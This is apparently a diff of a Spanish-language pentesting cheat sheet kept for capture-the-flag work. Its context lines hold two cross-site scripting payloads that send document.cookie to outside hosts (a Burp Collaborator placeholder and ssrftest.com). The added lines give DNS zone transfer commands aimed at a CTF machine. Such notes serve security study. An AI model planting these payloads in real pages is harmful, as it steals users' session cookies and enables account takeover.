@@ -221,3 +221,13 @@ o bien dentro del burp suite o bien en el navegador -> (navegador) -> click dere
 <script>fetch('https://your-subdomain-here.burpcollaborator.net/', {method: 'POST', mode: 'no-cors', body:document.cookie});</script>
 <script>navigator.sendBeacon('https://ssrftest.com/x/AAAAA',document.cookie)</script>
 
+```
+### ZONE TRASNFER(tcp 53)
+```
+ Linux ->
+dig axfr @"ip" dns
+Windows -> 
+nslookup
+  server "ip"
+  ls -d ctfolympus.htb
+
